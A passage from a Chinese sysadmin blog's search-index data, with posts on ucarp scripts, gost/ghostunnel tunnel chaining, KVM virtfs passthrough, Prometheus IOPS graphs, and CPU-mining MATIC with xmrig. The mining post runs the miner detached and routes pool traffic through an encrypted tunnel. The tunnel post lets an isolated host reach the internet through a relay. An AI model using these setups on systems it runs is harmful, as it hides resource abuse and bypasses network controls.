${1}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e/sbin/ip neigh flush dev ${1}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat\u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/vip-down.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e/sbin/ip addr del ${2}/24 dev ${1}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e/usr/sbin/arp -d ${2}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e755\u003c/span\u003e /usr/local/bin/ucarp.sh /usr/local/bin/vip-up.sh /usr/local/bin/vip-down.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eok，第一台机器就配置好了\u003c/p\u003e","title":"ucarp的安装配置"},{"content":"用过了好几个 tunnel 工具软件，各有长处。\nghostunnel 是支持自定义 tls 证书加密的，这回用个更厉害的，支持各种代理链条的，gost\n项目地址：https://github.com/ginuerzh/gost\n里面的概念有点意思，其实就两条，-L 本地监听，-F 链条转发。\n注意的就一点，-F 的时候实际是一个中转服务器。这个中转服务器要转发的规则需要在 -L 参数里指定。\n那么举个具体的例子：\n中转服务器开了一个明文端口 9999，这个端口跑的是 ghostunnel client，加密数据后传到另外一个ghostunnel server服务器，然后数据明文穿出，访问具体的目的网站的端口。\n客户端的服务器呢无外网访问权限，需要访问中转服务器 192.168.1.1 的 9999 端口，然后数据通过 ghostunnel 加密穿出到外网。\n中转服务器配置如下：\n# ghostunnel 监听本地环回地址的9999端口，TLS 加密穿越到外网110.114.5.19:9999，然后根据外网 server 里面的配置，到达最终目的地 ip 和 端口 ghostunnel client --listen localhost:9999 --target 110.114.5.19:9999 --keystore client.pem --cacert ca.pem --unsafe-listen # gost 监听本地网卡192.168.1.1的9999端口 gost-linux-amd64-2.11.1 -L=tls://192.168.1.1:9999 客户端配置如下：\ngost-linux-amd64-2.11.1 -L=tcp://localhost:9999/localhost:9999 -F=tls://192.168.1.1:9999 这样客户端的程序，只要连接 localhost:9999 的 tcp 端口，就可以接力中转服务器穿出去了。\n上面的配置非常怪异吧，仔细解释一下：\n中转服务器呢有两个地址，localhost的环回地址，以及本地网卡192.168.1.1\nlocalhost:9999 是用 ghostunnel 加密 tcp 流量，tls 穿到外网 110.114.5.19 的 9999 端口，然后外网再转发。\n中转服务器同时监听了一个 192.168.1.1:9999 端口 tls 的加密代理端口。\n中转服务器的部分就完了。\n而客户端配置 -L = tcp://localhost:9999/localhost:9999\n第一个 localhost:9999 指的是本机的地址，第二个 localhost:9999 指的是中转机上面的转发地址，这个地方非常让人迷惑。\n强调一下：中转代理的转发配置是在客户端设置，而不是中转代理上设置。 然后 -F 指定了中转服务器，就可以了。\n最后一个要注意的地方，代理协议无论是 tls 、kcp 等，都自带缺省的证书，如果不满意，可以自己指定的。这个工具不用特意生成证书来使用。\n","permalink":"https://rendoumi.com/posts/20220224-gost_tunnel/","summary":"\u003cp\u003e用过了好几个 tunnel 工具软件，各有长处。\u003c/p\u003e\n\u003cp\u003eghostunnel 是支持自定义 tls 证书加密的，这回用个更厉害的，支持各种代理链条的，gost\u003c/p\u003e\n\u003cp\u003e项目地址：https://github.com/ginuerzh/gost\u003c/p\u003e\n\u003cp\u003e里面的概念有点意思，其实就两条，-L 本地监听，-F 链条转发。\u003c/p\u003e\n\u003cp\u003e注意的就一点，-F 的时候实际是一个中转服务器。这个中转服务器要转发的规则需要在 -L 参数里指定。\u003c/p\u003e\n\u003cp\u003e那么举个具体的例子：\u003c/p\u003e\n\u003cp\u003e中转服务器开了一个明文端口 9999，这个端口跑的是 ghostunnel client，加密数据后传到另外一个ghostunnel server服务器，然后数据明文穿出，访问具体的目的网站的端口。\u003c/p\u003e\n\u003cp\u003e客户端的服务器呢无外网访问权限，需要访问中转服务器 192.168.1.1 的 9999 端口，然后数据通过 ghostunnel 加密穿出到外网。\u003c/p\u003e\n\u003cp\u003e中转服务器配置如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ghostunnel 监听本地环回地址的9999端口，TLS 加密穿越到外网110.114.5.19:9999，然后根据外网 server 里面的配置，到达最终目的地 ip 和 端口\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eghostunnel client --listen localhost:9999 --target 110.114.5.19:9999 --keystore client.pem --cacert ca.pem --unsafe-listen\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# gost 监听本地网卡192.168.1.1的9999端口\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egost-linux-amd64-2.11.1 -L\u003cspan class=\"o\"\u003e=\u003c/span\u003etls://192.168.1.1:9999\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e客户端配置如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egost-linux-amd64-2.11.1 -L\u003cspan class=\"o\"\u003e=\u003c/span\u003etcp://localhost:9999/localhost:9999 -F\u003cspan class=\"o\"\u003e=\u003c/span\u003etls://192.168.1.1:9999\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样客户端的程序，只要连接 localhost:9999 的 tcp 端口，就可以接力中转服务器穿出去了。\u003c/p\u003e\n\u003cp\u003e上面的配置非常怪异吧，仔细解释一下：\u003c/p\u003e\n\u003cp\u003e中转服务器呢有两个地址，localhost的环回地址，以及本地网卡192.168.1.1\u003c/p\u003e\n\u003cp\u003elocalhost:9999 是用 ghostunnel 加密 tcp 流量，tls 穿到外网 110.114.5.19 的 9999 端口，然后外网再转发。\u003c/p\u003e","title":"gost tunnel的使用"},{"content":"这个需求也很有点意思，DBA 要求做 MySQL 的卸载从库，数据量会很大，硬盘空间后期需要扩容，但是 cpu 反倒占的不多。\n单独 MySQL 是无法限制其 CPU 核使用的，这样的话，最好就是做个虚机来控制 MySQL 总 CPU 核数的使用，然后硬盘扩容的话，比如要拉伸虚机的附加第二块硬盘，如果是 QEMU 格式，会花费很长时间，所以干脆把宿主机的目录直接透传进虚机，之后如果要扩容加硬盘，直接把新的大硬盘 mount 出来再透进去即可，新旧硬盘拷贝数据也比拉伸虚机硬盘快。\nCentOS7 下的做法如下：\n两个大前提：\n一、宿主机的 KVM qemu 系统需要使用新的 rpm 包，需要编译\n二、虚机的内核需要升级，mount 命令需要支持 -t p9 的新格式\n我们做好准备，就可以开始了\n一、编译宿主机的qemu新包 现在已经是2022年了，所以编译的方式也发生变化了，最佳编译方式是干脆启动一个 Docker 虚拟机，来编译出来 rpm 包，也不污染环境。\n首先克隆下来项目：\ngit clone https://github.com/AlekseyChudov/qemu-kvm-virtfs.git cd qemu-kvm-virtfs 看一下最后的 build 脚本，有一个地方需要修改：\n现在的 CentOS 最新版是 7.9.2009 ，这个版本树里是没有 qemu 的 Source Code 的，需要修改 baseurl，降低到 7.8.2003 才有 Source 的 repo\nbaseurl=https://mirrors.tripadvisor.com/centos-vault/centos/\\$releasever/virt/Source/kvm-common/ 改成： baseurl=https://mirrors.tripadvisor.com/centos-vault/centos/7.8.2003/virt/Source/kvm-common/ 改好后 build 脚本如下\n#!/bin/bash set -ex yum -y update yum -y install \\ \u0026#34;@Development Tools\u0026#34; \\ centos-release-qemu-ev \\ glusterfs-api-devel \\ glusterfs-devel \\ iasl \\ kernel-devel \\ libcacard-devel \\ libepoxy-devel \\ mesa-libgbm-devel \\ nss-devel \\ spice-protocol \\ spice-server-devel \\ usbredir-devel cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/yum.repos.d/CentOS-QEMU-EV.repo [centos-qemu-ev-source] name=CentOS-\\$releasever - QEMU EV Sources baseurl=https://mirrors.tripadvisor.com/centos-vault/centos/7.8.2003/virt/Source/kvm-common/ gpgcheck=1 enabled=0 gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-SIG-Virtualization EOF yum-builddep -y qemu-kvm-ev yumdownloader --source qemu-kvm-ev rpm -Uvh qemu-kvm-ev-*.src.rpm sed -i \u0026#39;s/--disable-virtfs/--enable-virtfs/\u0026#39; /root/rpmbuild/SOURCES/build_configure.sh sed -i -e \u0026#39;/^%files -n qemu-kvm-common/,/^$/s/^$/%{_bindir}\\/virtfs-proxy-helper\\n%{_mandir}\\/man1\\/virtfs-proxy-helper.1.gz\\n/\u0026#39; \\ -e \u0026#39;/^%if %{rhev}$/,/^%else$/s/pkgsuffix -ev/pkgsuffix -virtfs/\u0026#39; \\ -e \u0026#39;/%define rhel_rhev_conflicts()/ a Provides: %1-ev = %{epoch}:%{version}-%{release} \\\\\\nObsoletes: %1-ev \u0026lt; %{obsoletes_version} \\\\\u0026#39; \\ /root/rpmbuild/SPECS/qemu-kvm.spec rpmbuild -ba --clean /root/rpmbuild/SPECS/qemu-kvm.spec 然后一句话执行 Build：\ncd qemu-kvm-virtfs docker run -it --privileged -v \u0026#34;$PWD/rpmbuild:/root/rpmbuild\u0026#34; \\ docker.io/centos:7 /root/rpmbuild/build 会得到如下的包，版本是 2.12.0-44.1.el7_8.1 ： rpmbuild/RPMS/x86_64/qemu-img-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm rpmbuild/RPMS/x86_64/qemu-kvm-common-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm rpmbuild/RPMS/x86_64/qemu-kvm-tools-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm rpmbuild/RPMS/x86_64/qemu-kvm-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm rpmbuild/RPMS/x86_64/qemu-kvm-virtfs-debuginfo-2.12.0-44.1.el7_8.1.x86_64.rpm rpmbuild/SRPMS/qemu-kvm-virtfs-2.12.0-44.1.el7_8.1.src.rpm 我们在宿主机上安装替换新的 qemu 包，并重启 libvirtd\nyum -y install \\ cloud-utils \\ libvirt-client \\ libvirt-daemon-config-network \\ libvirt-daemon-config-nwfilter \\ libvirt-daemon-driver-interface \\ libvirt-daemon-driver-qemu \\ virt-install \\ rpmbuild/RPMS/x86_64/qemu-img-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm \\ rpmbuild/RPMS/x86_64/qemu-kvm-common-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm \\ rpmbuild/RPMS/x86_64/qemu-kvm-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm systemctl restart libvirtd 这样宿主机就准备好了。\n二、生产虚机，做好passthrough 生产虚机的时候，需要做好内外文件目录的直通，宿主机目录是 /opt/test，对应虚机目录是 /test\n\u0026lt;domains ...\u0026gt; ... \u0026lt;devices ...\u0026gt; \u0026lt;filesystem type=\u0026#39;mount\u0026#39; accessmode=\u0026#39;passthrough\u0026#39;\u0026gt; \u0026lt;source dir=\u0026#39;/opt/test\u0026#39;/\u0026gt; \u0026lt;target dir=\u0026#39;/test\u0026#39;/\u0026gt; \u0026lt;/filesystem\u0026gt; \u0026lt;/devices\u0026gt; \u0026lt;/domains\u0026gt; 虚机启动后，需要升级核心，支持新的 mount 选项\nyum -y update yum -y --enablerepo centosplus install kernel-plus reboot # 把宿主机提供的 /test 点 mount 出来 mount -t 9p -o trans=virtio,version=9p2000.L /test /opt/test 也可以把挂载点写进虚机的 fstab，下次就会自动 mount 了\n/test /opt/test 9p trans=virtio,version=9p2000.L,nofail,_netdev,x-mount.mkdir 0 0 ","permalink":"https://rendoumi.com/posts/20220223-kvm_passthrouth/","summary":"\u003cp\u003e这个需求也很有点意思，DBA 要求做 MySQL 的卸载从库，数据量会很大，硬盘空间后期需要扩容，但是 cpu 反倒占的不多。\u003c/p\u003e\n\u003cp\u003e单独 MySQL 是无法限制其 CPU 核使用的，这样的话，最好就是做个虚机来控制 MySQL 总 CPU 核数的使用，然后硬盘扩容的话，比如要拉伸虚机的附加第二块硬盘，如果是 QEMU 格式，会花费很长时间，所以干脆把宿主机的目录直接透传进虚机，之后如果要扩容加硬盘，直接把新的大硬盘 mount 出来再透进去即可，新旧硬盘拷贝数据也比拉伸虚机硬盘快。\u003c/p\u003e\n\u003cp\u003eCentOS7 下的做法如下：\u003c/p\u003e\n\u003cp\u003e两个大前提：\u003c/p\u003e\n\u003cp\u003e一、宿主机的 KVM qemu 系统需要使用新的 rpm 包，需要编译\u003c/p\u003e\n\u003cp\u003e二、虚机的内核需要升级，mount 命令需要支持 -t p9 的新格式\u003c/p\u003e\n\u003cp\u003e我们做好准备，就可以开始了\u003c/p\u003e\n\u003ch2 id=\"一编译宿主机的qemu新包\"\u003e一、编译宿主机的qemu新包\u003c/h2\u003e\n\u003cp\u003e现在已经是2022年了，所以编译的方式也发生变化了，最佳编译方式是干脆启动一个 Docker 虚拟机，来编译出来 rpm 包，也不污染环境。\u003c/p\u003e\n\u003cp\u003e首先克隆下来项目：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003egit clone https://github.com/AlekseyChudov/qemu-kvm-virtfs.git\n\ncd qemu-kvm-virtfs\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e看一下最后的 build 脚本，有一个地方需要修改：\u003c/p\u003e\n\u003cp\u003e现在的 CentOS 最新版是 7.9.2009 ，这个版本树里是没有 qemu 的 Source Code 的，需要修改 baseurl，降低到 7.8.2003 才有 Source 的 repo\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebaseurl\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003ehttps://mirrors.tripadvisor.com/centos-vault/centos/\\$releasever/virt/Source/kvm-common/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e改成：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebaseurl\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003ehttps://mirrors.tripadvisor.com/centos-vault/centos/7.8.2003/virt/Source/kvm-common/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e改好后 build 脚本如下\u003c/p\u003e","title":"KVM下宿主机的目录直通到虚机"},{"content":"这是个严肃话题，正经挖以太币的话，很多的矿厂都是如果直接挖到以太币地址，那么必须挖到完整一个才允许提现，手续费还特高。\n但是如果挖到以太链Polygon的地址的话，就可以 0.005 ETH提币了，如下图所示\n但是千万记住，Polygon提出的所谓 0.005 ETH，看下图，只是个ERC-20的Token，实际是wETH Token，必须经过转换才能提到 ETH 去。\n从 ERC-20 转换到其它代币呢，需要 MATIC 代币来付账，这玩意也必须得有啊！废话不多说，直接放上挖MATIC教程，我的机器是 CentoOS\n首先需要有个完全自主的的 ETH 钱包地址，这个我就不教大家了\n一、下载xmrig挖矿软件 下载地址：https://github.com/xmrig/xmrig/releases\n我们选择最近的下载就好\n二、做好加密通道 我们需要做好一条加密tcp通道\n用 ghostunnel, localhost:9012 \u0026mdash;\u0026gt; vps:9012 \u0026mdash;\u0026gt; rx.unmineable.com:3333\n三、用screen后台开挖 screen #./xmrig -o localhost:9999 -a rx -k -u DOGE:MATIC地址.矿工名 ./xmrig -o localhost:9012 -u MATIC:0x64358C7ddC96001697aBbA7ed431BADB6ABAaec5.cpu01 -p x --cpu-no-yield ctrl+a+d 四、查看挖了多少 查看地址：https://unmineable.com/coins/MATIC/address/\n五、兑换 挖到了足够的 MATIC，就可以愉快的兑换了。\n","permalink":"https://rendoumi.com/posts/20220222-eth_matic/","summary":"\u003cp\u003e这是个严肃话题，正经挖以太币的话，很多的矿厂都是如果直接挖到以太币地址，那么必须挖到完整一个才允许提现，手续费还特高。\u003c/p\u003e\n\u003cp\u003e但是如果挖到以太链Polygon的地址的话，就可以 0.005 ETH提币了，如下图所示\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220222154256454\" loading=\"lazy\" src=\"/posts/20220222-eth_matic/image-20220222154256454.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是千万记住，Polygon提出的所谓 0.005 ETH，看下图，只是个ERC-20的Token，实际是wETH Token，必须经过转换才能提到 ETH 去。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220222154450998\" loading=\"lazy\" src=\"/posts/20220222-eth_matic/image-20220222154450998.png\"\u003e\u003c/p\u003e\n\u003cp\u003e从 ERC-20 转换到其它代币呢，需要 MATIC 代币来付账，这玩意也必须得有啊！废话不多说，直接放上挖MATIC教程，我的机器是 CentoOS\u003c/p\u003e\n\u003cp\u003e首先需要有个完全自主的的 ETH 钱包地址，这个我就不教大家了\u003c/p\u003e\n\u003ch2 id=\"一下载xmrig挖矿软件\"\u003e一、下载xmrig挖矿软件\u003c/h2\u003e\n\u003cp\u003e下载地址：https://github.com/xmrig/xmrig/releases\u003c/p\u003e\n\u003cp\u003e我们选择最近的下载就好\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Float Left\" loading=\"lazy\" src=\"/posts/20220222-eth_matic/image-20211021101957637.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"二做好加密通道\"\u003e二、做好加密通道\u003c/h2\u003e\n\u003cp\u003e我们需要做好一条加密tcp通道\u003c/p\u003e\n\u003cp\u003e用 ghostunnel,    localhost:9012 \u0026mdash;\u0026gt; vps:9012 \u0026mdash;\u0026gt; rx.unmineable.com:3333\u003c/p\u003e\n\u003ch2 id=\"三用screen后台开挖\"\u003e三、用screen后台开挖\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003escreen\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#./xmrig -o localhost:9999 -a rx -k -u DOGE:MATIC地址.矿工名\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./xmrig -o localhost:9012 -u MATIC:0x64358C7ddC96001697aBbA7ed431BADB6ABAaec5.cpu01 -p x --cpu-no-yield\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ectrl+a+d\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20211021102338089\" loading=\"lazy\" src=\"/posts/20220222-eth_matic/image-20211021102338089.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"四查看挖了多少\"\u003e四、查看挖了多少\u003c/h2\u003e\n\u003cp\u003e查看地址：\u003ca href=\"https://unmineable.com/coins/MATIC/address/\"\u003ehttps://unmineable.com/coins/MATIC/address/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220222154854349\" loading=\"lazy\" src=\"/posts/20220222-eth_matic/image-20220222154854349.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"五兑换\"\u003e五、兑换\u003c/h2\u003e\n\u003cp\u003e挖到了足够的 MATIC，就可以愉快的兑换了。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220222155452048\" loading=\"lazy\" src=\"/posts/20220222-eth_matic/image-20220222155452048.png\"\u003e\u003c/p\u003e","title":"如何用CPU挖Polygon网络的MATIC币"},{"content":"公司要做阿里的小程序接入，需要通过测试，测试呢需要提供硬盘的监控报告，比如 iops 。\n同事从网上找了一下，iops 监控原文如下：监控磁盘的 iops ，利用 linux 的 /proc/diskstats 的第四个字段和第八字段可监控读和写的 iops，第四个记录是记录所有读的次数，第八个字段是记录所有写的次数。通过 zabbix 上的差速率即可监控磁盘的 iops。\n文章链接：https://cloud.tencent.com/developer/article/1519113?ivk_sa=1024320u\n仔细研究了一下上面的文章，看了它提供了两张监控图，分析一下：\n第一张图：\n有两个指标，绿色的是硬盘每秒的 io 读次数，红色的是硬盘每秒的 io 写次数。\n第二张图：\n同样两个指标，绿色的是硬盘每秒的 io 读 Bytes，红色的是硬盘每秒的 io 写 Bytes。\n知道了指标具体的含义，这样就好办了。\n我们用的是 prometheus 和 node_exporter\n首先去看看 node_exporter 暴露的指标，搜一搜 node_disk，会看到如下4个指标：\n# HELP node_disk_reads_completed_total The total number of reads completed successfully. # TYPE node_disk_reads_completed_total counter node_disk_reads_completed_total{device=\u0026#34;sda\u0026#34;} 4.9530358e+07 # HELP node_disk_writes_completed_total The total number of writes completed successfully. # TYPE node_disk_writes_completed_total counter node_disk_writes_completed_total{device=\u0026#34;sda\u0026#34;} 1.4449267304e+10 # HELP node_disk_read_bytes_total The total number of bytes read successfully. # TYPE node_disk_read_bytes_total counter node_disk_read_bytes_total{device=\u0026#34;sda\u0026#34;} 6.4101677568e+11 # HELP node_disk_written_bytes_total The total number of bytes written successfully. # TYPE node_disk_written_bytes_total counter node_disk_written_bytes_total{device=\u0026#34;sda\u0026#34;} 1.15483858333184e+14 可以看出是上面 4 个指标，这四个指标都是 counter 计数器类型的，都是只增不减的。\n然后去 prometheus ，画个图试试，query 分别如下（注意我们的 instance 即 node_exporter，是跑在了 50000 端口，是非标准的）：\nnode_disk_reads_completed_total{instance=\u0026#34;192.168.1.1:50000\u0026#34;} node_disk_writes_completed_total{instance=\u0026#34;192.168.1.1:50000\u0026#34;} node_disk_read_bytes_total{instance=\u0026#34;192.168.1.1:50000\u0026#34;} node_disk_written_bytes_total{instance=\u0026#34;192.18.1.1:50000\u0026#34;} 大家看到了 counter 类型，必然是一条斜线直冲天际。\n好了，我们然后去 grafana 里增加面板：\n选 Add Query\n先选数据源，选择系统中已经配好的 prometheus，怎么配这里就不说了：\n然后在 Query 的 Metrics 里填入 node_disk_written_bytes_total{instance=\u0026quot;192.168.1.1:50000\u0026quot;}：\n在 Legend 的空白处随便点一下，大折线出现了，而且给出了提示：Time series is monotonically increasing. Try applying a rate() function.\n听人劝，吃饱饭。我们改一下 Metrics 的查询语句，因为我们是5分钟抓一次数据，所以改成如下格式： rate(node_disk_written_bytes_total{instance=\u0026quot;192.18.1.1:50000\u0026quot;}[5m])\n再增加一个查询，Add Query 同时把 read bytes 和 write bytes 放进一张图去：\n最后修正一下：\nA: Metrics: rate(node_disk_read_bytes_total{instance=\u0026#34;192.168.1.1:50000\u0026#34;}[5m]) Legend: sda read per second B: Metrics: rate(node_disk_written_bytes_total{instance=\u0026#34;192.168.1.1:50000\u0026#34;}[5m]) Legend: sda write per second 再把最大、最小、平均、当前给出来：\n这样图就做好了，最后完工的两张图：\n所有 prometheus 从各种 exporter 收上来的数据都可以这么图形化，以后画图就丰简由人了。\n","permalink":"https://rendoumi.com/posts/20220118-grafana_prometheus/","summary":"\u003cp\u003e公司要做阿里的小程序接入，需要通过测试，测试呢需要提供硬盘的监控报告，比如 iops 。\u003c/p\u003e\n\u003cp\u003e同事从网上找了一下，iops 监控原文如下：监控磁盘的 iops ，利用 linux 的 /proc/diskstats 的第四个字段和第八字段可监控读和写的 iops，第四个记录是记录所有读的次数，第八个字段是记录所有写的次数。通过 zabbix 上的差速率即可监控磁盘的 iops。\u003c/p\u003e\n\u003cp\u003e文章链接：\u003ca href=\"https://cloud.tencent.com/developer/article/1519113?ivk_sa=1024320u\"\u003ehttps://cloud.tencent.com/developer/article/1519113?ivk_sa=1024320u\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e仔细研究了一下上面的文章，看了它提供了两张监控图，分析一下：\u003c/p\u003e\n\u003cp\u003e第一张图：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220118093026319\" loading=\"lazy\" src=\"/posts/20220118-grafana_prometheus/image-20220118093026319.png\"\u003e\u003c/p\u003e\n\u003cp\u003e有两个指标，绿色的是硬盘每秒的 io 读次数，红色的是硬盘每秒的 io 写次数。\u003c/p\u003e\n\u003cp\u003e第二张图：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220118093147796\" loading=\"lazy\" src=\"/posts/20220118-grafana_prometheus/image-20220118093147796.png\"\u003e同样两个指标，绿色的是硬盘每秒的 io 读 Bytes，红色的是硬盘每秒的 io 写 Bytes。\u003c/p\u003e\n\u003cp\u003e知道了指标具体的含义，这样就好办了。\u003c/p\u003e\n\u003cp\u003e我们用的是 prometheus 和 node_exporter\u003c/p\u003e\n\u003cp\u003e首先去看看 node_exporter 暴露的指标，搜一搜 node_disk，会看到如下4个指标：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# HELP node_disk_reads_completed_total The total number of reads completed successfully.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# TYPE node_disk_reads_completed_total counter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enode_disk_reads_completed_total{device\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;sda\u0026#34;} 4.9530358e+07\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# HELP node_disk_writes_completed_total The total number of writes completed successfully.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# TYPE node_disk_writes_completed_total counter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enode_disk_writes_completed_total{device\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;sda\u0026#34;} 1.4449267304e+10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# HELP node_disk_read_bytes_total The total number of bytes read successfully.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# TYPE node_disk_read_bytes_total counter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 